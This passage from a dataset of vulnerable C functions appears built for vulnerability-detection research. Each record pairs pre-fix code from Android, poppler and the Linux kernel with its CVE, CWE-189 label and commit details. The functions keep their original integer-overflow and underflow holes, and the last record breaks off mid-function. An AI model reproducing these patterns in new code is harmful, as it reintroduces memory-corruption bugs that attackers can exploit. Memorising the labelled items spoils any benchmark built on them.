{"idx": 8028, "project": "Android", "commit_id": "5e751957ba692658b7f67eb03ae5ddb2cd3d970c", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/5e751957ba692658b7f67eb03ae5ddb2cd3d970c", "commit_message": "None", "target": 1, "func": "status_t ESDS::parseESDescriptor(size_t offset, size_t size) {\n if (size < 3) {\n return ERROR_MALFORMED;\n }\n\n    offset += 2; // skip ES_ID\n    size -= 2;\n\n unsigned streamDependenceFlag = mData[offset] & 0x80;\n unsigned URL_Flag = mData[offset] & 0x40;\n unsigned OCRstreamFlag = mData[offset] & 0x20;\n\n ++offset;\n\n     --size;\n \n     if (streamDependenceFlag) {\n         offset += 2;\n         size -= 2;\n     }\n\n if (URL_Flag) {\n if (offset >= size) {\n\n             return ERROR_MALFORMED;\n         }\n         unsigned URLlength = mData[offset];\n         offset += URLlength + 1;\n         size -= URLlength + 1;\n     }\n \n     if (OCRstreamFlag) {\n         offset += 2;\n         size -= 2;\n \n if ((offset >= size || mData[offset] != kTag_DecoderConfigDescriptor)\n && offset - 2 < size\n && mData[offset - 2] == kTag_DecoderConfigDescriptor) {\n            offset -= 2;\n            size += 2;\n\n            ALOGW(\"Found malformed 'esds' atom, ignoring missing OCR_ES_Id.\");\n }\n }\n\n if (offset >= size) {\n return ERROR_MALFORMED;\n }\n\n uint8_t tag;\n size_t sub_offset, sub_size;\n status_t err = skipDescriptorHeader(\n            offset, size, &tag, &sub_offset, &sub_size);\n\n if (err != OK) {\n return err;\n }\n\n if (tag != kTag_DecoderConfigDescriptor) {\n return ERROR_MALFORMED;\n }\n\n    err = parseDecoderConfigDescriptor(sub_offset, sub_size);\n\n return err;\n}\n", "func_hash": 251778599478684276636244536595568896329, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1539", "cve_desc": "Multiple integer underflows in the ESDS::parseESDescriptor function in ESDS.cpp in libstagefright in Android before 5.1.1 LMY48I allow remote attackers to execute arbitrary code via crafted ESDS atoms, aka internal bug 20139950, a related issue to CVE-2015-4493.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1539"}
{"idx": 8029, "project": "Android", "commit_id": "d44e5bde18a41beda39d49189bef7f2ba7c8f3cb", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/base/+/d44e5bde18a41beda39d49189bef7f2ba7c8f3cb", "commit_message": "None", "target": 1, "func": "static jobject Bitmap_createFromParcel(JNIEnv* env, jobject, jobject parcel) {\n if (parcel == NULL) {\n SkDebugf(\"-------- unparcel parcel is NULL\\n\");\n return NULL;\n }\n\n    android::Parcel* p = android::parcelForJavaObject(env, parcel);\n\n const bool        isMutable = p->readInt32() != 0;\n const SkColorType colorType = (SkColorType)p->readInt32();\n const SkAlphaType alphaType = (SkAlphaType)p->readInt32();\n const int         width = p->readInt32();\n const int         height = p->readInt32();\n const int         rowBytes = p->readInt32();\n const int         density = p->readInt32();\n\n if (kN32_SkColorType != colorType &&\n            kRGB_565_SkColorType != colorType &&\n            kARGB_4444_SkColorType != colorType &&\n            kIndex_8_SkColorType != colorType &&\n            kAlpha_8_SkColorType != colorType) {\n SkDebugf(\"Bitmap_createFromParcel unknown colortype: %d\\n\", colorType);\n\n         return NULL;\n     }\n \n    SkBitmap* bitmap = new SkBitmap;\n \n    bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes);\n \n     SkColorTable* ctable = NULL;\n     if (colorType == kIndex_8_SkColorType) {\n         int count = p->readInt32();\n         if (count > 0) {\n             size_t size = count * sizeof(SkPMColor);\n             const SkPMColor* src = (const SkPMColor*)p->readInplace(size);\n             ctable = new SkColorTable(src, count);\n         }\n     }\n \n    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap, ctable);\n     if (NULL == buffer) {\n         SkSafeUnref(ctable);\n        delete bitmap;\n         return NULL;\n     }\n \n SkSafeUnref(ctable);\n\n size_t size = bitmap->getSize();\n\n    android::Parcel::ReadableBlob blob;\n\n     android::status_t status = p->readBlob(size, &blob);\n     if (status) {\n         doThrowRE(env, \"Could not read bitmap from parcel blob.\");\n        delete bitmap;\n         return NULL;\n     }\n \n    bitmap->lockPixels();\n    memcpy(bitmap->getPixels(), blob.data(), size);\n    bitmap->unlockPixels();\n\n \n     blob.release();\n \n    return GraphicsJNI::createBitmap(env, bitmap, buffer, getPremulBitmapCreateFlags(isMutable),\n            NULL, NULL, density);\n }\n", "func_hash": 104165536811189073630917968198942145348, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1536", "cve_desc": "Integer overflow in the Bitmap_createFromParcel function in core/jni/android/graphics/Bitmap.cpp in Android before 5.1.1 LMY48I allows attackers to cause a denial of service (system_server crash) or obtain sensitive system_server memory-content information via a crafted application that leverages improper unmarshalling of bitmaps, aka internal bug 19666945.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1536"}
{"idx": 8691, "project": "Android", "commit_id": "e8c62fb484151f76ab88b1d5130f38de24ac8c14", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/system/core/+/e8c62fb484151f76ab88b1d5130f38de24ac8c14", "commit_message": "None", "target": 1, "func": " native_handle_t* native_handle_create(int numFds, int numInts)\n {\n    native_handle_t* h = malloc(\n            sizeof(native_handle_t) + sizeof(int)*(numFds+numInts));\n \n     if (h) {\n         h->version = sizeof(native_handle_t);\n         h->numFds = numFds;\n        h->numInts = numInts;\n }\n return h;\n}\n", "func_hash": 224579899326037251238494808605404031930, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1528", "cve_desc": "Integer overflow in the native_handle_create function in libcutils/native_handle.c in Android before 5.1.1 LMY48M allows attackers to obtain a different application's privileges or cause a denial of service (Binder heap memory corruption) via a crafted application, aka internal bug 19334482.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1528"}
{"idx": 9103, "project": "poppler", "commit_id": "c839b706092583f6b12ed3cc634bf5af34b7a2bb", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=c839b706", "commit_message": "[glib] Fix CVE-2009-3607", "target": 1, "func": "create_surface_from_thumbnail_data (guchar *data,\n\t\t\t\t    gint    width,\n\t\t\t\t    gint    height,\n \t\t\t\t    gint    rowstride)\n {\n   guchar *cairo_pixels;\n   cairo_surface_t *surface;\n  static cairo_user_data_key_t key;\n   int j;\n \n  cairo_pixels = (guchar *)g_malloc (4 * width * height);\n  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,\n\t\t\t\t\t\t CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, 4 * width);\n  cairo_surface_set_user_data (surface, &key,\n\t\t\t       cairo_pixels, (cairo_destroy_func_t)g_free);\n \n   for (j = height; j; j--) {\n     guchar *p = data;\n     guchar *q = cairo_pixels;\n     guchar *end = p + 3 * width;\n     while (p < end) {\n #if G_BYTE_ORDER == G_LITTLE_ENDIAN\n       q[0] = p[2];\n       q[1] = p[1];\n       q[2] = p[0];\n#else\t  \n       q[1] = p[0];\n       q[2] = p[1];\n       q[3] = p[2];\n#endif\n      p += 3;\n      q += 4;\n     }\n \n     data += rowstride;\n    cairo_pixels += 4 * width;\n   }\n \n   return surface;\n}\n", "func_hash": 200511016327768201854565868573404023031, "file_name": "poppler-page.cc", "file_hash": 336532641126171856060182580994595185824, "cwe": ["CWE-189"], "cve": "CVE-2009-3607", "cve_desc": "Integer overflow in the create_surface_from_thumbnail_data function in glib/poppler-page.cc in Poppler 0.x allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.  NOTE: some of these details are obtained from third party information.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3607"}
{"idx": 9180, "project": "linux", "commit_id": "44afb3a04391a74309d16180d1e4f8386fdfa745", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745", "commit_message": "drm/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed (\"drm/i915: Avoid\nallocation for execbuffer object list\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>", "target": 1, "func": "i915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n \t\t\treturn -EINVAL;\n \t\t}\n \n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}\n", "func_hash": 74444851096954785728179020873301313744, "file_name": "i915_gem_execbuffer.c", "file_hash": 303738507866677893557271065352293241482, "cwe": ["CWE-189"], "cve": "CVE-2012-2384", "cve_desc": "Integer overflow in the i915_gem_do_execbuffer function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2384"}
{"idx": 9204, "project": "linux", "commit_id": "9438fabb73eb48055b58b89fc51e0bc4db22fabd", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/9438fabb73eb48055b58b89fc51e0bc4db22fabd", "commit_message": "cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to\nthe resume_name_len in the cifs_search_info. The resume_name_len however\nis unsigned and for some infolevels is populated directly from a 32 bit\nvalue sent by the server.\n\nIf the server sends a very large value for this, then that value could\nlook negative when converted to a signed int. That would make that\nvalue pass the PATH_MAX check later in CIFSFindNext. The name_len would\nthen be used as a length value for a memcpy. It would then be treated\nas unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org>\nReported-by: Darren Lavender <dcl@hppine99.gbr.hp.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>", "target": 1, "func": "int CIFSFindNext(const int xid, struct cifs_tcon *tcon,\n\t\t __u16 searchHandle, struct cifs_search_info *psrch_inf)\n{\n\tTRANSACTION2_FNEXT_REQ *pSMB = NULL;\n\tTRANSACTION2_FNEXT_RSP *pSMBr = NULL;\n \tT2_FNEXT_RSP_PARMS *parms;\n \tchar *response_data;\n \tint rc = 0;\n\tint bytes_returned, name_len;\n \t__u16 params, byte_count;\n \n \tcFYI(1, \"In FindNext\");\n\n\tif (psrch_inf->endOfSearch)\n\t\treturn -ENOENT;\n\n\trc = smb_init(SMB_COM_TRANSACTION2, 15, tcon, (void **) &pSMB,\n\t\t(void **) &pSMBr);\n\tif (rc)\n\t\treturn rc;\n\n\tparams = 14; /* includes 2 bytes of null string, converted to LE below*/\n\tbyte_count = 0;\n\tpSMB->TotalDataCount = 0;       /* no EAs */\n\tpSMB->MaxParameterCount = cpu_to_le16(8);\n\tpSMB->MaxDataCount =\n\t\tcpu_to_le16((tcon->ses->server->maxBuf - MAX_CIFS_HDR_SIZE) &\n\t\t\t\t0xFFFFFF00);\n\tpSMB->MaxSetupCount = 0;\n\tpSMB->Reserved = 0;\n\tpSMB->Flags = 0;\n\tpSMB->Timeout = 0;\n\tpSMB->Reserved2 = 0;\n\tpSMB->ParameterOffset =  cpu_to_le16(\n\t      offsetof(struct smb_com_transaction2_fnext_req,SearchHandle) - 4);\n\tpSMB->DataCount = 0;\n\tpSMB->DataOffset = 0;\n\tpSMB->SetupCount = 1;\n\tpSMB->Reserved3 = 0;\n\tpSMB->SubCommand = cpu_to_le16(TRANS2_FIND_NEXT);\n\tpSMB->SearchHandle = searchHandle;      /* always kept as le */\n\tpSMB->SearchCount =\n\t\tcpu_to_le16(CIFSMaxBufSize / sizeof(FILE_UNIX_INFO));\n\tpSMB->InformationLevel = cpu_to_le16(psrch_inf->info_level);\n\tpSMB->ResumeKey = psrch_inf->resume_key;\n\tpSMB->SearchFlags =\n\t      cpu_to_le16(CIFS_SEARCH_CLOSE_AT_END | CIFS_SEARCH_RETURN_RESUME);\n\n\tname_len = psrch_inf->resume_name_len;\n\tparams += name_len;\n\tif (name_len < PATH_MAX) {\n\t\tmemcpy(pSMB->ResumeFileName, psrch_inf->presume_name, name_len);\n\t\tbyte_count += name_len;\n\t\t/* 14 byte parm len above enough for 2 byte null terminator */\n\t\tpSMB->ResumeFileName[name_len] = 0;\n\t\tpSMB->ResumeFileName[name_len+1] = 0;\n\t} else {\n\t\trc = -EINVAL;\n\t\tgoto FNext2_err_exit;\n\t}\n\tbyte_count = params + 1 /* pad */ ;\n\tpSMB->TotalParameterCount = cpu_to_le16(params);\n\tpSMB->ParameterCount = pSMB->TotalParameterCount;\n\tinc_rfc1001_len(pSMB, byte_count);\n\tpSMB->ByteCount = cpu_to_le16(byte_count);\n\n\trc = SendReceive(xid, tcon->ses, (struct smb_hdr *) pSMB,\n\t\t\t(struct smb_hdr *) pSMBr, &bytes_returned, 0);\n\tcifs_stats_inc(&tcon->num_fnext);\n\tif (rc) {\n\t\tif (rc == -EBADF) {\n\t\t\tpsrch_inf->endOfSearch = true;\n\t\t\tcifs_buf_release(pSMB);\n\t\t\trc = 0; /* search probably was closed at end of search*/\n\t\t} else\n\t\t\tcFYI(1, \"FindNext returned = %d\", rc);\n\t} else {                /* decode response */\n\t\trc = validate_t2((struct smb_t2_rsp *)pSMBr);\n\n\t\tif (rc == 0) {\n\t\t\tunsigned int lnoff;\n\n\t\t\t/* BB fixme add lock for file (srch_info) struct here */\n\t\t\tif (pSMBr->hdr.Flags2 & SMBFLG2_UNICODE)\n\t\t\t\tpsrch_inf->unicode = true;\n\t\t\telse\n\t\t\t\tpsrch_inf->unicode = false;\n\t\t\tresponse_data = (char *) &pSMBr->hdr.Protocol +\n\t\t\t       le16_to_cpu(pSMBr->t2.ParameterOffset);\n\t\t\tparms = (T2_FNEXT_RSP_PARMS *)response_data;\n\t\t\tresponse_data = (char *)&pSMBr->hdr.Protocol +\n\t\t\t\tle16_to_cpu(pSMBr->t2.DataOffset);\n\t\t\tif (psrch_inf->smallBuf)\n\t\t\t\tcifs_small_buf_release(\n\t\t\t\t\tpsrch_inf->ntwrk_buf_start);\n\t\t\telse\n\t\t\t\tcifs_buf_release(psrch_inf->ntwrk_buf_start);\n\t\t\tpsrch_inf->srch_entries_start = response_data;\n\t\t\tpsrch_inf->ntwrk_buf_start = (char *)pSMB;\n\t\t\tpsrch_inf->smallBuf = 0;\n\t\t\tif (parms->EndofSearch)\n\t\t\t\tpsrch_inf->endOfSearch = true;\n\t\t\telse\n\t\t\t\tpsrch_inf->endOfSearch = false;\n\t\t\tpsrch_inf->entries_in_buffer =\n\t\t\t\t\t\tle16_to_cpu(parms->SearchCount);\n\t\t\tpsrch_inf->index_of_last_entry +=\n\t\t\t\tpsrch_inf->entries_in_buffer;\n\t\t\tlnoff = le16_to_cpu(parms->LastNameOffset);\n\t\t\tif (tcon->ses->server->maxBuf - MAX_CIFS_HDR_SIZE <\n\t\t\t      lnoff) {\n\t\t\t\tcERROR(1, \"ignoring corrupt resume name\");\n\t\t\t\tpsrch_inf->last_entry = NULL;\n\t\t\t\treturn rc;\n\t\t\t} else\n\t\t\t\tpsrch_inf->last_entry =\n\t\t\t\t\tpsrch_inf->srch_entries_start + lnoff;\n\n/*  cFYI(1, \"fnxt2 entries in buf %d index_of_last %d\",\n\t    psrch_inf->entries_in_buffer, psrch_inf->index_of_last_entry); */\n\n\t\t\t/* BB fixme add unlock here */\n\t\t}\n\n\t}\n\n\t/* BB On error, should we leave previous search buf (and count and\n\tlast entry fields) intact or free the previous one? */\n\n\t/* Note: On -EAGAIN error only caller can retry on handle based calls\n\tsince file handle passed in no longer valid */\nFNext2_err_exit:\n\tif (rc != 0)\n\t\tcifs_buf_release(pSMB);\n\treturn rc;\n}\n", "func_hash": 168747422728345508248514807716181598995, "file_name": "cifssmb.c", "file_hash": 5687335587622834096783179306942943734, "cwe": ["CWE-189"], "cve": "CVE-2011-3191", "cve_desc": "Integer signedness error in the CIFSFindNext function in fs/cifs/cifssmb.c in the Linux kernel before 3.1 allows remote CIFS servers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a large length value in a response to a read request for a directory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3191"}
{"idx": 9213, "project": "linux", "commit_id": "b5b515445f4f5a905c5dd27e6e682868ccd6c09d", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5b515445f4f5a905c5dd27e6e682868ccd6c09d", "commit_message": "[SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that\ncauses all sorts of ugliness, including heap corruption or triggering the\nOOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type\nPMCRAID_PASSTHROUGH_IOCTL.  This calls through to\npmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer\nis copied in, and the request_size variable is set to\nbuffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit\nsigned value provided by the user.  If a negative value is provided\nhere, bad things can happen.  For example,\npmcraid_build_passthrough_ioadls() is called with this request_size,\nwhich immediately calls pmcraid_alloc_sglist() with a negative size.\nThe resulting math on allocating a scatter list can result in an\noverflow in the kzalloc() call (if num_elem is 0, the sglist will be\nsmaller than expected), or if num_elem is unexpectedly large the\nsubsequent loop will call alloc_pages() repeatedly, a high number of\npages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in\npmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: James Bottomley <JBottomley@Parallels.com>", "target": 1, "func": "static long pmcraid_ioctl_passthrough(\n\tstruct pmcraid_instance *pinstance,\n\tunsigned int ioctl_cmd,\n\tunsigned int buflen,\n\tunsigned long arg\n)\n{\n\tstruct pmcraid_passthrough_ioctl_buffer *buffer;\n\tstruct pmcraid_ioarcb *ioarcb;\n\tstruct pmcraid_cmd *cmd;\n\tstruct pmcraid_cmd *cancel_cmd;\n\tunsigned long request_buffer;\n\tunsigned long request_offset;\n\tunsigned long lock_flags;\n\tvoid *ioasa;\n\tu32 ioasc;\n\tint request_size;\n\tint buffer_size;\n\tu8 access, direction;\n\tint rc = 0;\n\n\t/* If IOA reset is in progress, wait 10 secs for reset to complete */\n\tif (pinstance->ioa_reset_in_progress) {\n\t\trc = wait_event_interruptible_timeout(\n\t\t\t\tpinstance->reset_wait_q,\n\t\t\t\t!pinstance->ioa_reset_in_progress,\n\t\t\t\tmsecs_to_jiffies(10000));\n\n\t\tif (!rc)\n\t\t\treturn -ETIMEDOUT;\n\t\telse if (rc < 0)\n\t\t\treturn -ERESTARTSYS;\n\t}\n\n\t/* If adapter is not in operational state, return error */\n\tif (pinstance->ioa_state != IOA_STATE_OPERATIONAL) {\n\t\tpmcraid_err(\"IOA is not operational\\n\");\n\t\treturn -ENOTTY;\n\t}\n\n\tbuffer_size = sizeof(struct pmcraid_passthrough_ioctl_buffer);\n\tbuffer = kmalloc(buffer_size, GFP_KERNEL);\n\n\tif (!buffer) {\n\t\tpmcraid_err(\"no memory for passthrough buffer\\n\");\n\t\treturn -ENOMEM;\n\t}\n\n\trequest_offset =\n\t    offsetof(struct pmcraid_passthrough_ioctl_buffer, request_buffer);\n\n\trequest_buffer = arg + request_offset;\n\n\trc = __copy_from_user(buffer,\n\t\t\t     (struct pmcraid_passthrough_ioctl_buffer *) arg,\n\t\t\t     sizeof(struct pmcraid_passthrough_ioctl_buffer));\n\n\tioasa =\n\t(void *)(arg +\n\t\toffsetof(struct pmcraid_passthrough_ioctl_buffer, ioasa));\n\n\tif (rc) {\n\t\tpmcraid_err(\"ioctl: can't copy passthrough buffer\\n\");\n\t\trc = -EFAULT;\n\t\tgoto out_free_buffer;\n\t}\n\n\trequest_size = buffer->ioarcb.data_transfer_length;\n\n\tif (buffer->ioarcb.request_flags0 & TRANSFER_DIR_WRITE) {\n\t\taccess = VERIFY_READ;\n\t\tdirection = DMA_TO_DEVICE;\n\t} else {\n\t\taccess = VERIFY_WRITE;\n\t\tdirection = DMA_FROM_DEVICE;\n\t}\n\n\tif (request_size > 0) {\n\t\trc = access_ok(access, arg, request_offset + request_size);\n\n\t\tif (!rc) 